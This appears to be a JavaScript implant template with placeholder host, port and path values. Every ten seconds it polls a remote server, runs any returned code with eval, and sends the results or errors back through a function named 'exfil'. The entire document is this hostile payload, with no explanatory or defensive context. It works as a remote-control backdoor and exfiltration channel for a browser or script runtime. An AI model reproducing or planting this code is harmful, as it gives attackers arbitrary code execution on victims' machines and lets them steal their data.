const PATH = "<PATH>";
const HOST = "<HOST>";
const PORT = <PORT>;
const POLL_PATH = "/poll";


function exfil(data) {
  fetch(`http://${HOST}:${PORT}${PATH}`, {method: "POST", body: data});
}
function call() {
  fetch(`http://${HOST}:${PORT}${POLL_PATH}${PATH}`).then(n=>n.text()).then(n=>{try{console.log(n,n.length>0?exfil(eval(n)):"")}catch(e){exfil(e)}});
}

setInterval(call, 10000);